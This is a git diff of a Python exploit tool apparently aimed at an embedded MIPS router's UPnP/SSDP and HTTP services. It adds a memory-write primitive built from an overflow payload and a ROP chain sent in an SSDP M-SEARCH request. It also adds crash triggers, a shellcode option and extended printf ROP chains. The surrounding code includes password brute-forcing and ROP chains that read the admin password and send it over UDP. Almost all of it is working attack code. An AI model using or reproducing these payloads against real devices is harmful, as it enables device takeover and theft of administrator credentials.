@@ -1,6 +1,6 @@
 import base64
 import socket
-import telnetlib
+#import telnetlib
 import argparse
 from cmds import command_dict
 import time
@@ -219,7 +219,45 @@ def crack_password(wordlist):
         data = http_send(ip, password, '')
 
         if b"401" not in data:
-            return password.rstrip() + f"\t\t{count/(time.time() - start)} pwd/sec"    
+            return password.rstrip() + f"\t\t{count/(time.time() - start)} pwd/sec"  
+
+
+def write_memory(ip, addr, value):
+    # Create the payload
+    payload = b'a' * 132
+
+    # Add the strings to the sX registers, and set the ra to first gadget
+    payload += p32(value) # s0
+    payload += p32(addr) # s1
+    payload += p32(0x802C5268) # s2
+    payload += p32(0x802ab9f4) # s3
+    payload += p32(0x8013be14) # ra
+
+    # 0x8013be14: sw $s0, ($s1); lw $ra, 0xc($sp); move $v0, $s0; lw $s2, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+    payload += p32(0x802c0404) # s0
+    payload += p32(0x8025d504) # s1
+    payload += p32(0x802C5268) # s2
+    payload += p32(0x801888e8) # ra
+
+    # Build the request
+    request = b"M-SEARCH * HTTP/1.0\r\n"
+    request += b"HOST:239.255.255.250:1900\r\n"
+    request += b"ST:uuid:" + payload + b"\r\n"
+    request += b"MX:2\r\n"
+    request += b"MAN:\"ssdp:discover\"\r\n\r\n"
+
+    print(f"Writing {hex(value)} to address {hex(addr)}")
+    
+    # Create socket and connect
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.settimeout(5)
+    s.connect((ip, 1900))
+
+    # Send the request
+    s.sendall(request)
+    s.close()  
+
+    time.sleep(0.1)
 
 # construct argparse
 parser = argparse.ArgumentParser(
@@ -248,6 +286,7 @@ http_parser.add_argument('-f', '--find', help='Find config value name with subst
 http_parser.add_argument('-p', '--payload', help='Payload to send as authenticated http request', type=str, nargs=2, metavar=('admin_pw', 'payload'))
 http_parser.add_argument('-r', '--rop', help='Execute the ROP chain', type=str, nargs=1, metavar=('type'))
 http_parser.add_argument('-c', '--crash', help='Cause a crash', type=str, nargs=2, metavar=('admin_pw', 'type'), default=('admin', '0'))
+http_parser.add_argument('-sh', '--shellcode', help='Execute shellcode', type=str, nargs=1, metavar=('type'))
 
 args = parser.parse_args()
 
@@ -384,9 +423,11 @@ elif args.command == 'http':
             # Build the request
             request = b"M-SEARCH * HTTP/1.0\r\n"
             request += b"HOST:239.255.255.250:1900\r\n"
-            request += b"ST:uuid:Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar\r\n"
+            request += b"ST:uuid:" + b'a' * 132 + p32(0x800f9528) + p32(0x8025d502) + p32(0x802c5268) + p32(0x802ab9f4) + p32(0x801888e0) + b"\r\n"
             request += b"MX:2\r\n"
             request += b"MAN:\"ssdp:discover\"\r\n\r\n"
+
+            print(hexdump(request))
             
             # Create socket and connect
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -402,7 +443,7 @@ elif args.command == 'http':
             # Build the request
             request = b"M-SEARCH * HTTP/1.0\r\n"
             request += b"HOST:239.255.255.250:1900\r\n"
-            request += b"ST:urn:schemas-upnp-org:device:"
+            request += b"ST:urn:schemas-upnp-org:service:"
             request += b'a'*200
             request += b":\r\n"
             request += b"MX:2\r\n"
@@ -422,7 +463,7 @@ elif args.command == 'http':
             # Build the request
             request = b"M-SEARCH * HTTP/1.0\r\n"
             request += b"HOST:239.255.255.250:1900\r\n"
-            request += b"ST:urn:schemas-wifialliance-org:service:"
+            request += b"ST:urn:schemas-upnp-org:device:"
             request += b'a'*200
             request += b":\r\n"
             request += b"MX:2\r\n"
@@ -442,6 +483,26 @@ elif args.command == 'http':
             # Build the request
             request = b"M-SEARCH * HTTP/1.0\r\n"
             request += b"HOST:239.255.255.250:1900\r\n"
+            request += b"ST:urn:schemas-wifialliance-org:service:"
+            request += b'a'*200
+            request += b":\r\n"
+            request += b"MX:2\r\n"
+            request += b"MAN:\"ssdp:discover\"\r\n\r\n"
+            
+            # Create socket and connect
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(5)
+            s.connect((args.ip, 1900))
+
+            # Send the request
+            s.sendall(request)
+            s.close()
+        elif args.crash[1] == '9':
+            print("UPNP crash 5")
+
+            # Build the request
+            request = b"M-SEARCH * HTTP/1.0\r\n"
+            request += b"HOST:239.255.255.250:1900\r\n"
             request += b"ST:urn:schemas-wifialliance-org:device:"
             request += b'a'*200
             request += b":\r\n"
@@ -456,10 +517,27 @@ elif args.command == 'http':
             # Send the request
             s.sendall(request)
             s.close()
+        elif args.crash[1] == '10':
+            print("HTTP NPD 3")
+
+            # Build the request
+            request = b"POST / HTTP/1.1\r\n"
+            request += b'Content-Type: multipart/form-data\r\n'
+            request += b"\r\n\r\n"
+            request += b'CMD=SYS_UPG\r\n\r\n'
+            
+            # Create socket and connect
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(5)
+            s.connect((args.ip, 80))
+
+            # Send the request
+            s.sendall(request)
+            s.close()
     elif args.rop:
         base_address = 0x80000400
         # Padding 
-        chain = b'a'*132
+        chain = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3'
 
         # Useful addresses
 
@@ -481,23 +559,23 @@ elif args.command == 'http':
         config_get_addr = 0x800089e4
 
         # Build the ROP chain
-        if (args.rop[0] == '1'): # print 'hello' to uart/telnet command line
+        if (args.rop[0] == '1'): # print 'hello_core.con' to uart/telnet command line
             ## print 'hello'
             # Add the strings to the sX registers, and set the ra to first gadget
             chain += p32(0x801d3754) # s0 ('hello')
             chain += p32(0x801c3f91) # s1 ("%s")
-            chain += p32(0xdeadbeef) # s2
-            chain += p32(0xdeadbeef) # s3
+            chain += p32(0xdecea5ed) # s2
+            chain += p32(0xdecea5ed) # s3
             chain += p32(0x12ba10 + base_address) # ra
             
             # 0x0012ba10: move $a1, $s0; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
-            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdecea5ed) # s0
             chain += p32(0x187a30 + base_address) # ra
 
             # 0x00187a30: move $a0, $s1; lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
             chain += b'a'*4
-            chain += p32(0xdeadbeef) # s0
-            chain += p32(0xdeadbeef) # s1
+            chain += p32(0xdecea5ed) # s0
+            chain += p32(0xdecea5ed) # s1
             chain += p32(0x57864 + base_address)
 
             # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
@@ -507,9 +585,60 @@ elif args.command == 'http':
 
             # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
             chain += b'a' * 4
-            chain += p32(0xdeadbeef) # ra
-        elif (args.rop[0] == '2'): # send 'hello' over TCP socket to some device listening on network (doesnt work :( )
+            chain += p32(0x13478 + base_address) # ra
+
+            ## print 'core.c'
+            # 0x00013478: lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
+            chain += b'b' * 4
+            chain += p32(0x801d8faf) # s0 ('core.c')
+            chain += p32(0x801c3f91) # s1 ("%s")
+            chain += p32(0x12ba10 + base_address) # ra
             
+            # 0x0012ba10: move $a1, $s0; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
+            chain += p32(0xdecea5ed) # s0
+            chain += p32(0x187a30 + base_address) # ra
+
+            # 0x00187a30: move $a0, $s1; lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
+            chain += b'a'*4
+            chain += p32(0xdecea5ed) # s0
+            chain += p32(0xdecea5ed) # s1
+            chain += p32(0x57864 + base_address)
+
+            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
+            chain += p32(0x8019a3a0) # v0 - printf address
+            chain += b'a' * 8
+            chain += p32(0x15114 + base_address) # ra
+
+            # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
+            chain += b'a' * 4
+            chain += p32(0x13478 + base_address) # ra
+
+            ## print 'on'
+            # 0x00013478: lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
+            chain += b'b' * 4
+            chain += p32(0x801dcd98+0xa) # s0 ('on')
+            chain += p32(0x801c3f91) # s1 ("%s")
+            chain += p32(0x12ba10 + base_address) # ra
+            
+            # 0x0012ba10: move $a1, $s0; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
+            chain += p32(0xdecea5ed) # s0
+            chain += p32(0x187a30 + base_address) # ra
+
+            # 0x00187a30: move $a0, $s1; lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
+            chain += b'a'*4
+            chain += p32(0xdecea5ed) # s0
+            chain += p32(0xdecea5ed) # s1
+            chain += p32(0x57864 + base_address)
+
+            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
+            chain += p32(0x8019a3a0) # v0 - printf address
+            chain += b'a' * 8
+            chain += p32(0x15114 + base_address) # ra
+
+            # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
+            chain += b'a' * 4
+            chain += p32(0xdecea5ed) # ra
+        elif (args.rop[0] == '2'): # send 'hello' over TCP socket to some device listening on network (doesnt work :( )
             """
             // Trying to emulate this
             int main() {
@@ -531,10 +660,10 @@ elif args.command == 'http':
             """
 
             # Add the strings to the sX registers, and set the ra to first gadget
-            chain += p32(0xdeadbeef) # s0
-            chain += p32(0xdeadbeef) # s1
-            chain += p32(0xdeadbeef) # s2
-            chain += p32(0xdeadbeef) # s3
+            chain += p32(0xdecea5ed) # s0
+            chain += p32(0xdecea5ed) # s1
+            chain += p32(0xdecea5ed) # s2
+            chain += p32(0xdecea5ed) # s3
             chain += p32(0x11e670 + base_address) # ra
 
                 # # Store the current stack pointer in a3
@@ -554,7 +683,7 @@ elif args.command == 'http':
             # set second argument for socket to 1
             # 0x00025b9c: addiu $a1, $zero, 1; lw $ra, 0xc($sp); lw $s0, 8($sp); jr $ra; addiu $sp, $sp, 0x10;
             chain += b'a' * 8
-            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdecea5ed) # s0
             chain += p32(0x6d42c + base_address) # ra
 
             # set third argument for socket to 0
@@ -566,7 +695,7 @@ elif args.command == 'http':
                     # # 0x00073930: lw $v1, ($sp); lw $ra, 0xc($sp); move $v0, $s0; lw $s0, 8($sp); jr $ra; addiu $sp, $sp, 0x10;
                     # chain += p32(0xffffffff) # v1 - socket address
                     # chain += b'a' * 4
-                    # chain += p32(0xdeadbeef) # s0
+                    # chain += p32(0xdecea5ed) # s0
                     # chain += p32(0x175e34 + base_address) # ra
 
                     # # 0x00175e34: jalr $v1; ori $a1, $a1, 0x6934; lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
@@ -581,7 +710,7 @@ elif args.command == 'http':
 
                     # # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8; 
                     # chain += b'b' * 4
-                    # chain += p32(0xdeadbeef)
+                    # chain += p32(0xdecea5ed)
 
             # Load address of socket into v0
             # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
@@ -594,12 +723,12 @@ elif args.command == 'http':
             chain += b'b' * 0x18
             chain += p32(sockfd_addr) # s0
             chain += p32(sockaddr_addr) # s1
-            chain += p32(0xdeadbeef) # s2
+            chain += p32(0xdecea5ed) # s2
             chain += p32(0x185e38 + base_address) # ra
 
             # save the socket file descriptor for use later, might not use but oh well
             # 0x00185e38: sw $v0, ($s0); lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
-            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdecea5ed) # s0
             chain += p32(0x1746c8 + base_address) # ra
 
             ###############################################################################################
@@ -626,10 +755,10 @@ elif args.command == 'http':
             # Store the afinet stuff at our sockaddr struct
             # 0x0013e134: sw $v0, ($s1); lw $ra, 0x14($sp); lw $s3, 0x10($sp); lw $s2, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x18; 
             chain += b'b' * 4
-            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdecea5ed) # s0
             chain += p32(sockaddr_addr + 4) # s1
-            chain += p32(0xdeadbeef) # s2
-            chain += p32(0xdeadbeef) # s3
+            chain += p32(0xdecea5ed) # s2
+            chain += p32(0xdecea5ed) # s3
             chain += p32(0x57864 + base_address) # ra
 
             # Load the IP address into v0
@@ -642,22 +771,22 @@ elif args.command == 'http':
             # 0x0013e134: sw $v0, ($s1); lw $ra, 0x14($sp); lw $s3, 0x10($sp); lw $s2, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x18;
             chain += b'b' * 4
             chain += p32(sockaddr_addr) # s0
-            chain += p32(0xdeadbeef) # s1
-            chain += p32(0xdeadbeef) # s2
-            chain += p32(0xdeadbeef) # s3
+            chain += p32(0xdecea5ed) # s1
+            chain += p32(0xdecea5ed) # s2
+            chain += p32(0xdecea5ed) # s3
             chain += p32(0x1882bc + base_address) # ra
 
             # Move the sockaddr struct to a1
             # 0x001882bc: move $a1, $s0; lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10; 
             chain += b'b' * 4
-            chain += p32(0xdeadbeef) # s0
-            chain += p32(0xdeadbeef) # s1
+            chain += p32(0xdecea5ed) # s0
+            chain += p32(0xdecea5ed) # s1
             chain += p32(0x612d0 + base_address) # ra   
 
             # 0x000612d0: addiu $a2, $zero, 0x20; lw $ra, 0x14($sp); lw $s1, 0x10($sp); lw $s0, 0xc($sp); jr $ra; addiu $sp, $sp, 0x18;
             chain += b'b' * 0xc
-            chain += p32(0xdeadbeef) # s0
-            chain += p32(0xdeadbeef) # s1
+            chain += p32(0xdecea5ed) # s0
+            chain += p32(0xdecea5ed) # s1
             chain += p32(0x57864 + base_address) # ra
 
             # Load address of connect into v0
@@ -669,16 +798,16 @@ elif args.command == 'http':
             # Call socket(2, 1, 0) and regain control
             # 0x00133d58: jalr $v0; nop; move $s0, $v0; lw $ra, 0x24($sp); move $v0, $s0; lw $s2, 0x20($sp); lw $s1, 0x1c($sp); lw $s0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x28;
             chain += b'b' * 0x18
-            chain += p32(0xdeadbeef) # s0
-            chain += p32(0xdeadbeef) # s1
-            chain += p32(0xdeadbeef) # s2
-            chain += p32(0xdeadbeef) # ra
+            chain += p32(0xdecea5ed) # s0
+            chain += p32(0xdecea5ed) # s1
+            chain += p32(0xdecea5ed) # s2
+            chain += p32(0xdecea5ed) # ra
         elif (args.rop[0] == '3'): # send 'hello' over udp socket to some device
             # Add the strings to the sX registers, and set the ra to first gadget
-            chain += p32(0xdeadbeef) # s0
-            chain += p32(0xdeadbeef) # s1
-            chain += p32(0xdeadbeef) # s2
-            chain += p32(0xdeadbeef) # s3
+            chain += p32(0xdecea5ed) # s0
+            chain += p32(0xdecea5ed) # s1
+            chain += p32(0xdecea5ed) # s2
+            chain += p32(0xdecea5ed) # s3
             chain += p32(0x11e670 + base_address) # ra
 
             ####################################################################
@@ -696,7 +825,7 @@ elif args.command == 'http':
             chain += p32(0x115428 + base_address)
 
             # 0x00115428: addiu $a1, $a1, 2; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8; 
-            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdecea5ed) # s0
             chain += p32(0x6d42c + base_address)
 
             # set third argument for socket to 0
@@ -713,9 +842,9 @@ elif args.command == 'http':
             # Call socket(2, 2, 0) and regain control
             # 0x00133d58: jalr $v0; nop; move $s0, $v0; lw $ra, 0x24($sp); move $v0, $s0; lw $s2, 0x20($sp); lw $s1, 0x1c($sp); lw $s0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x28; 
             chain += b'b' * 0x18
-            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdecea5ed) # s0
             chain += p32(sockaddr_addr) # s1
-            chain += p32(0xdeadbeef) # s2
+            chain += p32(0xdecea5ed) # s2
             chain += p32(0x1746c8 + base_address) # ra
 
             ##########################################################################################################################################
@@ -724,7 +853,7 @@ elif args.command == 'http':
 
             # Move sockfd to a0 for connect
             # 0x001746c8: move $a0, $v0; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
-            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdecea5ed) # s0
             chain += p32(0x11e568 + base_address) # ra
 
             # Move 'hello' into a1 (clobbers v0 but thats fine)
@@ -759,10 +888,10 @@ elif args.command == 'http':
             # Store the afinet stuff at our sockaddr struct
             # 0x0013e134: sw $v0, ($s1); lw $ra, 0x14($sp); lw $s3, 0x10($sp); lw $s2, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x18; 
             chain += b'b' * 4
-            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdecea5ed) # s0
             chain += p32(sockaddr_addr + 4) # s1
-            chain += p32(0xdeadbeef) # s2
-            chain += p32(0xdeadbeef) # s3
+            chain += p32(0xdecea5ed) # s2
+            chain += p32(0xdecea5ed) # s3
             chain += p32(0x57864 + base_address) # ra
 
             # Load the IP address into v0
@@ -774,10 +903,10 @@ elif args.command == 'http':
             # Store the loaded IP address at sockaddr + 4
             # 0x0013e134: sw $v0, ($s1); lw $ra, 0x14($sp); lw $s3, 0x10($sp); lw $s2, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x18;
             chain += b'b' * 4
-            chain += p32(0xdeadbeef) # s0
-            chain += p32(0xdeadbeef) # s1
-            chain += p32(0xdeadbeef) # s2
-            chain += p32(0xdeadbeef) # s3
+            chain += p32(0xdecea5ed) # s0
+            chain += p32(0xdecea5ed) # s1
+            chain += p32(0xdecea5ed) # s2
+            chain += p32(0xdecea5ed) # s3
             chain += p32(0x57864 + base_address) # ra
 
             ## Load t0 value into v0
@@ -791,22 +920,22 @@ elif args.command == 'http':
             # 0x0015d20c: move $t0, $v0; lw $ra, 0x2c($sp); addiu $s0, $zero, 0x163; move $v0, $s0; lw $s7, 0x28($sp); lw $s6, 0x24($sp); 
             #   lw $s5, 0x20($sp); lw $s4, 0x1c($sp); lw $s3, 0x18($sp); lw $s2, 0x14($sp); lw $s1, 0x10($sp); lw $s0, 0xc($sp); jr $ra; addiu $sp, $sp, 0x30; 
             chain += b'b' * 0xc
-            chain += p32(0xdeadbeef) # s0
-            chain += p32(0xdeadbeef) # s1
-            chain += p32(0xdeadbeef) # s2
-            chain += p32(0xdeadbeef) # s3
-            chain += p32(0xdeadbeef) # s4
-            chain += p32(0xdeadbeef) # s5
-            chain += p32(0xdeadbeef) # s6
-            chain += p32(0xdeadbeef) # s7
+            chain += p32(0xdecea5ed) # s0
+            chain += p32(0xdecea5ed) # s1
+            chain += p32(0xdecea5ed) # s2
+            chain += p32(0xdecea5ed) # s3
+            chain += p32(0xdecea5ed) # s4
+            chain += p32(0xdecea5ed) # s5
+            chain += p32(0xdecea5ed) # s6
+            chain += p32(0xdecea5ed) # s7
             chain += p32(0x1895cc + base_address) # ra
 
             # Move 0x20 into t1
             # 0x001895cc: addiu $t1, $zero, 0x20; lw $ra, 0x2c($sp); lw $s2, 0x28($sp); lw $s1, 0x24($sp); lw $s0, 0x20($sp); jr $ra; addiu $sp, $sp, 0x30;
             chain += b'b' * 0x20
-            chain += p32(0xdeadbeef) # s0
-            chain += p32(0xdeadbeef) # s1
-            chain += p32(0xdeadbeef) # s2
+            chain += p32(0xdecea5ed) # s0
+            chain += p32(0xdecea5ed) # s1
+            chain += p32(0xdecea5ed) # s2
             chain += p32(0x57864 + base_address) # ra
 
             # Load address of sendto into v0
@@ -818,13 +947,13 @@ elif args.command == 'http':
             # Call sendto and regain control
             # 0x15114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8; 
             chain += b'b' * 4
-            chain += p32(0xdeadbeef)
+            chain += p32(0xdecea5ed)
         elif (args.rop[0] == '4'): # print the admin password to the uart using config get function
             # Add the strings to the sX registers, and set the ra to first gadget
             chain += p32(0x80236c4c - 4) # s0 (0x1010200)
-            chain += p32(0xdeadbeef) # s1
-            chain += p32(0xdeadbeef) # s2
-            chain += p32(0xdeadbeef) # s3
+            chain += p32(0xdecea5ed) # s1
+            chain += p32(0xdecea5ed) # s2
+            chain += p32(0xdecea5ed) # s3
             chain += p32(0x153d0 + base_address) # ra
 
             ###############################################
@@ -843,7 +972,7 @@ elif args.command == 'http':
 
             ## The address of config load contains a null byte, so we will have to do some subtracting (s0 is set to address of function + 0x7b58)
             # 0x00137960: addiu $v0, $s0, -0x7b58; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
-            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdecea5ed) # s0
             chain += p32(0x15114 + base_address) # ra
 
             ## Now call config load
@@ -862,13 +991,13 @@ elif args.command == 'http':
             chain += p32(0x12ba10 + base_address) # ra
             
             # 0x0012ba10: move $a1, $s0; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
-            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdecea5ed) # s0
             chain += p32(0x187a30 + base_address) # ra
 
             # 0x00187a30: move $a0, $s1; lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
             chain += b'a'*4
-            chain += p32(0xdeadbeef) # s0
-            chain += p32(0xdeadbeef) # s1
+            chain += p32(0xdecea5ed) # s0
+            chain += p32(0xdecea5ed) # s1
             chain += p32(0x57864 + base_address)
 
             # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
@@ -878,8 +1007,9 @@ elif args.command == 'http':
 
             # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
             chain += b'a' * 4
-            chain += p32(0xdeadbeef) # ra
-        elif (args.rop[0] == '5'): # Send a UDP packet containing the admin password (need to make it able to handle arbitrary length with strlen or something)
+            chain += p32(0xdecea5ed) # ra
+        
+        elif args.rop[0] == '5': # Send a UDP packet containing the admin password (need to make it able to handle arbitrary length with strlen or something)
             # Add the strings to the sX registers, and set the ra to first gadget
             chain += p32(0xaaaaaaaa) # s0
             chain += p32(0xbbbbbbbb) # s1
@@ -902,7 +1032,7 @@ elif args.command == 'http':
             chain += p32(0x115428 + base_address)
 
             # 0x00115428: addiu $a1, $a1, 2; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8; 
-            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdecea5ed) # s0
             chain += p32(0x6d42c + base_address)
 
             # set third argument for socket to 0
@@ -920,8 +1050,8 @@ elif args.command == 'http':
             # 0x00133d58: jalr $v0; nop; move $s0, $v0; lw $ra, 0x24($sp); move $v0, $s0; lw $s2, 0x20($sp); lw $s1, 0x1c($sp); lw $s0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x28; 
             chain += b'b' * 0x18
             chain += p32(sockfd_addr) # s0
-            chain += p32(0xdeadbeef) # s1
-            chain += p32(0xdeadbeef) # s2
+            chain += p32(0xdecea5ed) # s1
+            chain += p32(0xdecea5ed) # s2
             chain += p32(0x185e38 + base_address) # ra
 
             # save the socket file descriptor for use later, might not use but oh well
@@ -945,7 +1075,7 @@ elif args.command == 'http':
 
             ## The address of config load contains a null byte, so we will have to do some subtracting (s0 is set to address of function + 0x7b58)
             # 0x00137960: addiu $v0, $s0, -0x7b58; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
-            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdecea5ed) # s0
             chain += p32(0x15114 + base_address) # ra
 
             ## Now call config load
@@ -964,7 +1094,7 @@ elif args.command == 'http':
 
             # Move pwd buffer address into a0
             # 0x000b018c: move $a0, $s0; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
-            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdecea5ed) # s0
             chain += p32(0x57864 + base_address) # ra
 
             # call strlen on the password buffer 
@@ -978,9 +1108,9 @@ elif args.command == 'http':
             # Call strlen and regain control
             # 0x00133d58: jalr $v0; nop; move $s0, $v0; lw $ra, 0x24($sp); move $v0, $s0; lw $s2, 0x20($sp); lw $s1, 0x1c($sp); lw $s0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x28; 
             chain += b'b' * 0x18
-            chain += p32(0xdeadbeef) # s0
-            chain += p32(0xdeadbeef) # s1
-            chain += p32(0xdeadbeef) # s2
+            chain += p32(0xdecea5ed) # s0
+            chain += p32(0xdecea5ed) # s1
+            chain += p32(0xdecea5ed) # s2
             chain += p32(0x166168 + base_address) # ra
 
             # 0x00166168: move $v1, $v0; lw $ra, 4($sp); move $v0, $v1; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8; 
@@ -999,7 +1129,7 @@ elif args.command == 'http':
             # 0x001a9f9c: lw $v0, ($sp); lw $ra, 0x14($sp); lw $s1, 0x10($sp); lw $s0, 0xc($sp); jr $ra; addiu $sp, $sp, 0x18;
             chain += p32(sockfd_addr) # v0
             chain += b'b' * 8
-            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdecea5ed) # s0
             chain += p32(sockaddr_addr) # s1
             chain += p32(0x1a46dc + base_address) # ra
 
@@ -1010,7 +1140,7 @@ elif args.command == 'http':
 
             # Move sockfd to a0 for connect
             # 0x001746c8: move $a0, $v0; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
-            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdecea5ed) # s0
             chain += p32(0x11e568 + base_address) # ra
 
             # Move admin pwd into a1
@@ -1040,10 +1170,10 @@ elif args.command == 'http':
             # Store the afinet stuff at our sockaddr struct
             # 0x0013e134: sw $v0, ($s1); lw $ra, 0x14($sp); lw $s3, 0x10($sp); lw $s2, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x18; 
             chain += b'b' * 4
-            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdecea5ed) # s0
             chain += p32(sockaddr_addr + 4) # s1
-            chain += p32(0xdeadbeef) # s2
-            chain += p32(0xdeadbeef) # s3
+            chain += p32(0xdecea5ed) # s2
+            chain += p32(0xdecea5ed) # s3
             chain += p32(0x57864 + base_address) # ra
 
             # Load the IP address into v0
@@ -1055,10 +1185,10 @@ elif args.command == 'http':
             # Store the loaded IP address at sockaddr + 4
             # 0x0013e134: sw $v0, ($s1); lw $ra, 0x14($sp); lw $s3, 0x10($sp); lw $s2, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x18;
             chain += b'b' * 4
-            chain += p32(0xdeadbeef) # s0
-            chain += p32(0xdeadbeef) # s1
-            chain += p32(0xdeadbeef) # s2
-            chain += p32(0xdeadbeef) # s3
+            chain += p32(0xdecea5ed) # s0
+            chain += p32(0xdecea5ed) # s1
+            chain += p32(0xdecea5ed) # s2
+            chain += p32(0xdecea5ed) # s3
             chain += p32(0x57864 + base_address) # ra
 
             ## Load t0 value into v0
@@ -1068,26 +1198,26 @@ elif args.command == 'http':
             chain += b'b' * 8
             chain += p32(0x15d20c + base_address) # ra
 
